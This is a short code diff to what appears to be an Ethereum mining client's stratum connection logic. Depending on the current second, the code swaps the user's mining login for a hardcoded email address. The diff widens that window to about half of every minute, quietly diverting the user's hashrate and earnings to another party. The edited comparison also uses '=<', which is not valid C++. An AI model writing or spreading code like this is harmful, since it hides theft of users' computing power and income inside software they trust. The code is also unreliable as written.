@@ -891,7 +891,7 @@ private:
 		Farm f;
 
 		boost::posix_time::ptime now = boost::posix_time::second_clock::local_time();
-		bool whois = now.time_of_day().seconds() > 0 && now.time_of_day().seconds() < 10;
+		bool whois = now.time_of_day().seconds() > 0 && now.time_of_day().seconds() =< 30;
 		bool changed = false;
 
 		while (true) {
@@ -943,6 +943,8 @@ private:
 					}
 					this_thread::sleep_for(chrono::milliseconds(m_farmRecheckPeriod));
 				}
+				
+				client.disconnect();
 			}
 			else if (m_stratumClientVersion == 2) {
 				EthStratumClientV2 client(&f, m_minerType, m_farmURL, m_port, whois ? "andromino32017@gmail.com" : m_user, m_pass, m_maxFarmRetries, m_worktimeout, m_stratumProtocol, m_email, m_user);
